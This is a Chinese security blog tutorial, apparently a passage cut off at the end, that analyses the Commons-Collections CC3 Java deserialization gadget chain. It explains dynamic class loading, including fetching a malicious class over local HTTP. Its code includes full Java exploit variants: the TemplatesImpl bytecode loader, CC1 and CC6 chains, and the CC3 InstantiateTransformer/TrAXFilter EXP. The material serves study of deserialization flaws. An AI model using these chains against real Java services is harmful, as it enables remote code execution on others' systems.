    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1和CC2都是通过反序列化自动执行了object()方法最终导致了<code>InvokerTransformer.transform(Method.invoke())</code>的命令执行，那有没有一种可能，不通过<code>InvokerTransformer.transform(Method.invoke())</code>来进行命令执行？CC3给出了答案，CC3是通过JAVA的动态类加载机制来自动执行恶意类代码。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li><p>JDK8u65</p>
</li>
<li><p>Commons-Collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>  <br>     &lt;dependency&gt;<br>         &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>         &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>         &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>     &lt;/dependency&gt;<br>  <br> &lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="JAVA动态类加载"><a href="#JAVA动态类加载" class="headerlink" title="JAVA动态类加载"></a>JAVA动态类加载</h2><h3 id="利用URLClassLoader加载class文件"><a href="#利用URLClassLoader加载class文件" class="headerlink" title="利用URLClassLoader加载class文件"></a>利用URLClassLoader加载class文件</h3><p>Java的<code>ClassLoader</code>来用来加载字节码文件最基础的方法，<code>ClassLoader </code>是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的<code> ClassLoader</code> 就是根据类名来加载类，这个类名是类完整路径，如<code>java.lang.Runtime</code>。</p>
<p><code>URLClassLoader</code> 继承了<code>ClassLoader</code>也就是说<code>URLClassLoader</code>把<code>ClassLoader</code>扩展了一下，所以可以理解成<code>URLClassLoader</code>功能要多点。<code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader </code>的工作过程实际上就是在解释默认的Java类加载器的工作流程。 </p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path </code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader </code>来寻找类，即为在Jar包中寻 找.class文件。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 <code>FileLoader </code>来寻找类，即为在本地文件系统中寻 找.class文件 。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。我们可以使用HTTP协议来测试一下，看Java是否能从远程HTTP服务器上加载.class文件。</p>
</li>
</ul>
<h4 id="http远程加载："><a href="#http远程加载：" class="headerlink" title="http远程加载："></a>http远程加载：</h4><p>我们编译一个恶意类，放在 <a href="http://localhost/Test.class">http://localhost/Test.class</a></p>
<p>(把编译好的class文件单独拿出来，放在另外一个目录，进入这个目录，利用python启动http服务就行<code>python -m http.server 80</code>)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234616607.png" alt="image-20240527234616607"></p>
<p> 成功请求到我们的 &#x2F;Test.class 文件，并执行了文件里的字节码。 所以，作为攻击者，如果我们能够控制目标<code> ClassLoader</code>的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528082827361.png" alt="image-20240528082827361"></p>
<h4 id="file本地加载"><a href="#file本地加载" class="headerlink" title="file本地加载:"></a>file本地加载:</h4><p>我们编译Test类，放在”C:\Users\Desktop” ，也是执行了文件里的字节码。他是则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻 找.class文件 。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234632078.png" alt="image-20240527234632078"></p>
<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>前面我们认识到了如何利用<code>URLClassLoader</code>加载远程class文件，也就是字节码。其实，不管是加 载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528090248851.png" alt="image-20240528090248851"></p>
<ul>
<li>其中： <code>loadClass </code>的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行<code> findClass</code> 。</li>
<li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code>。</li>
<li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类 。</li>
</ul>
<p>所以可见，真正核心的部分其实是 <code>defineClass</code> ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass </code>是一个native方法，逻辑在JVM的C语言代码中。 </p>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在<code> defineClass</code> 时也无法被直接调用到。所以，如果我们要使用 <code>defineClass</code> 在目标机器上执行任意代码，需要想办法调用构造函数。</p>
<p>（不进行初始化）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084507413.png" alt="image-20240528084507413"></p>
<p>（初始化）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084342573.png" alt="image-20240528084342573"></p>
<p>这里，因为系统的<code> ClassLoader#defineClass</code> 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。 在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。</p>
<h2 id="TemplatesImpl-解析"><a href="#TemplatesImpl-解析" class="headerlink" title="TemplatesImpl 解析"></a>TemplatesImpl 解析</h2><p>我们知道defineClass()可以直接加载字节码，那我们可以像之前找CC链一样，反过去找谁调用了defineClass()，找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>下的<code>TemplatesImpl.TransletCLassLoader.defineClass()</code></p>
<p>JAVA中没有访问权限修饰词的是default类型，它可以访问在同一个包中的其他类的成员。	</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526215828567.png" alt="image-20240526215828567"></p>
<p>看哪调用了<code> defineClass</code>，看到还是同类<code>TemplatesImpl.defineTransletClasses()</code>调用了<code>defineClass </code>但还是private，又找哪里调用了<code>defineTransletClasses ()</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220246988.png" alt="image-20240526220246988"></p>
<p>找到了<code> TemplatesImpl.getTransletInstance()</code>，正好<code>newInstance()</code>,但是还是 private。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220419165.png" alt="image-20240526220419165"></p>
<p>最终找到了 <code>TemplatesImpl.newTransformer()</code>是public</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220516376.png" alt="image-20240526220516376"></p>
<p>正好这个类继承了Serializable接口，就很方便我们</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105116341.png" alt="image-20240527105116341"></p>
<p>调用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527154250480.png" alt="image-20240527154250480"></p>
<h3 id="实现TemplatesImpl的逻辑"><a href="#实现TemplatesImpl的逻辑" class="headerlink" title="实现TemplatesImpl的逻辑"></a>实现TemplatesImpl的逻辑</h3><p>按照上面的步骤代码其实就需要这两行，但是肯定这样是不能运行的。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105424926.png" alt="image-20240527105424926"></p>
<p>让我们跟进<code>TemplatesImpl()</code>，其实后面的不赋值，也能走到我们想要的<code>getTransletInstance()</code>，跟进<code>getTransletInstance()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105723051.png" alt="image-20240527105723051"></p>
<p><code>_name</code>需要赋值</p>
<p><code>_class</code>不能赋值，因为我们就想调用<code>defineTransletClasses()</code></p>
<p>跟进<code> defineTransletClasses()</code></p>
<p>随后代码会走到<code>_class[transletIndex].newInstance()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105855030.png" alt="image-20240527105855030"></p>
<p>跟进<code> defineTransletClasses()</code></p>
<p><code>_bytecodes</code>需要赋值</p>
<p><code>_tfactory</code>需要调方法，需要赋值,去看一下 <code>_tfactory</code>是什么</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110211207.png" alt="image-20240527110211207"></p>
<p>可以看到<code>_tfactory</code>是transient，也就是说它并不能序列化。这就很有意思了，要用但是不能序列化，那有可能在<code>readObect()</code>里面。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110600370.png" alt="image-20240527110600370"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110644855.png" alt="image-20240527110644855"></p>
<p>随后<code>defineClass(_bytecodes[i])</code>加载字节码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213049967.png" alt="image-20240527213049967"></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>其他的都很简单，唯一的难点是可能不知道这里为啥这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Tests.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br></code></pre></td></tr></table></figure>

<p>因为_bytecodes是一个二维数组</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213730267.png" alt="image-20240527213730267"></p>
<p>但是<code>defineClass()</code>接收一个一维数组</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213808776.png" alt="image-20240527213808776"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="空指针报错"><a href="#空指针报错" class="headerlink" title="空指针报错"></a>空指针报错</h3><p>遇到一个空指针错误</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527112539992.png" alt="image-20240527112539992"></p>
<p>这里打个断点调试一下</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527153320593.png" alt="image-20240527153320593"></p>
<p>可以看到这里空指针报错，看一下逻辑，就是要求<code>_bytecodes</code>父类为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>然后把i的值赋给<code>_transletIndex</code>  (_transletIndex默认为-1) ，否则就空指针报错。</p>
<p>当<code>_transletIndex</code>&lt;0也会报错。所以只能将父类改为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527170701421.png" alt="image-20240527170701421"></p>
<p>导入<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 发现需要实现两个接口</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527113056413.png" alt="image-20240527113056413"></p>
<p><code>TemplatesImpl</code>的所有逻辑就走完了</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527173454095.png" alt="image-20240527173454095"></p>
<h2 id="CC1的TemplatesImpl-的实现方式"><a href="#CC1的TemplatesImpl-的实现方式" class="headerlink" title="CC1的TemplatesImpl 的实现方式"></a>CC1的TemplatesImpl 的实现方式</h2><p>没有什么特别的地方，本质上来讲就是换了一个执行命令的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<span class="hljs-comment">//调用templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>		<span class="hljs-comment">//CC1</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, 			Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC6的TemplatesImpl-的实现方式"><a href="#CC6的TemplatesImpl-的实现方式" class="headerlink" title="CC6的TemplatesImpl 的实现方式"></a>CC6的TemplatesImpl 的实现方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<span class="hljs-comment">//调用templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>		<span class="hljs-comment">//CC6</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC3调用链分析"><a href="#CC3调用链分析" class="headerlink" title="CC3调用链分析"></a>CC3调用链分析</h2><p>因为只需要调用 <code>TemplatesImpl</code> 类的 <code>newTransformer()</code> 方法，便可以进行命令执行，所以我们，查找谁调用了 <code>newTransformer()</code> </p>
<p><code> com.sun.org.apache.xalan.internal.xslt.trax#TrAXFilter.TrAXFilter()</code>,因为<code>TrAXFilter()类的newTransformer()</code>在构造函数里面，方便我们传参，所以选择它，但有个问题，<code>TrAXFilter</code>类并没有继承<code>Serializable</code> 接口，不能序列化所以我们只能从<code>TrAXFilter</code>的Class入手。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528100031807.png" alt="image-20240528100031807"></p>
<p>CC3的作者没有调用 <code>InvokerTransformer</code>，而是调用了一个新的类 <code>InstantiateTransformer</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528101227501.png" alt="image-20240528101227501"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528111906340.png" alt="image-20240528111906340"></p>
<h3 id="CC3链EXP"><a href="#CC3链EXP" class="headerlink" title="CC3链EXP"></a>CC3链EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\14341\\Desktop\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//    templates.newTransformer();</span><br>		<br>		<span class="hljs-comment">//为了调用Templates.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       <br>        instantiateTransformer.transform(TrAXFilter.class);<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="CC1实现CC3完整版"><a href="#CC1实现CC3完整版" class="headerlink" title="CC1实现CC3完整版"></a>CC1实现CC3完整版</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span 